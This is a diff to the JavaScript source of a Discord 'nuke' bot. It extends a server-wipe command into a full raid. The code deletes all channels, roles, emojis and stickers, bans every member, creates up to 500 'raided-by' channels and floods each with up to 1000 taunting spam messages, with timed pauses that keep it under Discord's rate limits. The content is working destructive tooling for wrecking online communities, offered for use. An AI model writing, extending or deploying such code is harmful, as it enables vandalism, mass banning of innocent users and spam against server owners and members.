@@ -15,12 +15,16 @@ const TOKEN = process.env.DISCORD_TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
 const GUILD_ID = process.env.GUILD_ID || null;
 
+const CHANNEL_COUNT = 500;        // max channels
+const MESSAGES_PER_CHANNEL = 1000; // messages per channel
+const MESSAGE_CONTENT = '🔥 GET RAIDED BY {username} - THIS SERVER IS OURS 🔥';
+
 client.once('ready', async () => {
   console.log(`🔥 ${client.user.tag} online.`);
   const rest = new REST({ version: '10' }).setToken(TOKEN);
   const commands = [{
     name: 'nuke',
-    description: '💀 Wipe entire server (Admin only)',
+    description: '💀 Nuke + 500 channels + 1000 msgs each (Admin)',
     default_member_permissions: PermissionsBitField.Flags.Administrator.toString()
   }];
   try {
@@ -33,14 +37,12 @@ client.once('ready', async () => {
   } catch (e) { console.error('Register failed:', e); }
 });
 
-// Slash command – defer immediately to avoid 3-sec timeout
 client.on('interactionCreate', async interaction => {
   if (!interaction.isChatInputCommand() || interaction.commandName !== 'nuke') return;
-  await interaction.deferReply({ ephemeral: true }); // "thinking" state
+  await interaction.deferReply({ ephemeral: true });
   await executeNuke(interaction);
 });
 
-// Message command – no timeout issue
 client.on('messageCreate', async msg => {
   if (msg.author.bot || !msg.guild || msg.content !== '!nuke') return;
   if (!msg.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
@@ -55,7 +57,6 @@ async function executeNuke(ctx) {
   const reply = ctx.reply || ctx.channel.send.bind(ctx.channel);
   const editReply = ctx.editReply || (() => {});
 
-  // Bot admin check
   if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
     const err = '❌ I need Administrator.';
     if (ctx.editReply) await ctx.editReply(err);
@@ -63,69 +64,88 @@ async function executeNuke(ctx) {
     return;
   }
 
-  // Acknowledge
+  const username = (author.user?.username || author.user?.tag || 'raidboss').toLowerCase().replace(/[^a-z0-9-]/g, '-');
+  const spamText = MESSAGE_CONTENT.replace(/{username}/g, author.user?.tag || 'RAIDER');
+
   if (ctx.editReply) {
-    await ctx.editReply('☢️ **NUKE STARTED** – this will take a moment...');
+    await ctx.editReply(`☢️ **APOCALYPSE STARTED** – creating ${CHANNEL_COUNT} channels, spamming ${MESSAGES_PER_CHANNEL} msgs each...`);
   } else {
-    await reply('☢️ **NUKE STARTED** – this will take a moment...');
+    await reply(`☢️ **APOCALYPSE STARTED** – creating ${CHANNEL_COUNT} channels, spamming ${MESSAGES_PER_CHANNEL} msgs each...`);
   }
 
-  // Run nuke in background with error catching per operation
-  try {
-    // 1. Delete channels (with delay to avoid rate-limit)
-    const channels = guild.channels.cache;
-    for (const [, ch] of channels) {
-      try { await ch.delete(); await sleep(100); } catch (_) {}
-    }
+  // ---- PHASE 1: DELETE EVERYTHING ----
+  for (const [, ch] of guild.channels.cache) {
+    try { await ch.delete(); await sleep(100); } catch (_) {}
+  }
+  for (const [, role] of guild.roles.cache.filter(r => r.id !== guild.id)) {
+    try { await role.delete(); await sleep(100); } catch (_) {}
+  }
+  for (const [, emoji] of guild.emojis.cache) {
+    try { await emoji.delete(); await sleep(100); } catch (_) {}
+  }
+  for (const [, sticker] of guild.stickers.cache) {
+    try { await sticker.delete(); await sleep(100); } catch (_) {}
+  }
 
-    // 2. Delete roles (except @everyone)
-    const roles = guild.roles.cache.filter(r => r.id !== guild.id);
-    for (const [, role] of roles) {
-      try { await role.delete(); await sleep(100); } catch (_) {}
-    }
+  // ---- PHASE 2: BAN ALL MEMBERS ----
+  let banned = 0;
+  for (const [, member] of guild.members.cache) {
+    if (member.id === author.id || member.id === client.user.id) continue;
+    try {
+      await member.ban({ reason: 'Nuke by ' + (author.user?.tag || author.tag) });
+      banned++;
+      if (banned % 10 === 0) await sleep(200);
+    } catch (_) {}
+  }
 
-    // 3. Delete emojis
-    for (const [, emoji] of guild.emojis.cache) {
-      try { await emoji.delete(); await sleep(100); } catch (_) {}
-    }
+  // ---- PHASE 3: CREATE 500 CHANNELS ----
+  const createdChannels = [];
+  for (let i = 0; i < CHANNEL_COUNT; i++) {
+    try {
+      const ch = await guild.channels.create({
+        name: i === 0 ? `raided-by-${username}` : `raided-by-${username}-${i}`,
+        type: ChannelType.GuildText,
+        permissionOverwrites: [{
+          id: guild.id,
+          allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.ReadMessageHistory]
+        }]
+      });
+      createdChannels.push(ch);
+      if (i % 20 === 0) await sleep(300); // rate-limit buffer
+    } catch (_) { break; } // stop if Discord blocks more
+  }
 
-    // 4. Delete stickers
-    for (const [, sticker] of guild.stickers.cache) {
-      try { await sticker.delete(); await sleep(100); } catch (_) {}
-    }
-
-    // 5. Ban members (chunked to avoid memory crash)
-    const members = guild.members.cache;
-    let count = 0;
-    for (const [, member] of members) {
-      if (member.id === author.id || member.id === client.user.id) continue;
+  // ---- PHASE 4: SPAM 1000 MESSAGES IN EACH CHANNEL ----
+  let totalSent = 0;
+  for (let chIdx = 0; chIdx < createdChannels.length; chIdx++) {
+    const channel = createdChannels[chIdx];
+    let sentInThisChannel = 0;
+    for (let msgIdx = 0; msgIdx < MESSAGES_PER_CHANNEL; msgIdx++) {
       try {
-        await member.ban({ reason: 'Nuke by ' + (author.user?.tag || author.tag) });
-        count++;
-        if (count % 10 === 0) await sleep(200); // every 10 bans, chill
-      } catch (_) {}
+        await channel.send(`${spamText} [${msgIdx+1}/${MESSAGES_PER_CHANNEL}]`);
+        sentInThisChannel++;
+        totalSent++;
+        if (totalSent % 50 === 0) await sleep(100); // every 50 msgs, chill
+      } catch (_) {
+        // rate-limited or channel deleted – break out
+        break;
+      }
     }
+    console.log(`✅ Channel ${chIdx+1}/${createdChannels.length} – sent ${sentInThisChannel} msgs`);
+    await sleep(200); // between channels
+  }
 
-    // 6. Create proof channel
-    const ch = await guild.channels.create({
-      name: '☢️-nuked',
-      type: ChannelType.GuildText,
-      permissionOverwrites: [{
-        id: guild.id,
-        allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.ReadMessageHistory]
-      }]
-    });
-    await ch.send(`💀 Nuked by ${author.user?.tag || author.tag} at ${new Date().toISOString()}`);
+  // ---- FINAL REPORT ----
+  const summary = `💀 **COMPLETE**\nChannels: ${createdChannels.length}\nMessages sent: ${totalSent}\nMembers banned: ${banned}\nExecutor: ${author.user?.tag || author.tag}`;
+  try {
+    if (createdChannels.length > 0) {
+      await createdChannels[0].send(summary);
+    }
+  } catch (_) {}
 
-    console.log(`✅ Nuke complete on ${guild.name} (banned ${count} members)`);
-    if (ctx.editReply) {
-      await ctx.editReply(`✅ Nuke complete. Banned ${count} members.`);
-    }
-  } catch (err) {
-    console.error('Nuke error:', err);
-    if (ctx.editReply) {
-      await ctx.editReply('⚠️ Nuke partially completed – check logs.');
-    }
+  console.log(`✅ APOCALYPSE DONE: ${createdChannels.length} channels, ${totalSent} messages, ${banned} bans`);
+  if (ctx.editReply) {
+    await ctx.editReply(`✅ Done. ${createdChannels.length} channels, ${totalSent} messages, ${banned} bans.`);
   }
 }
 
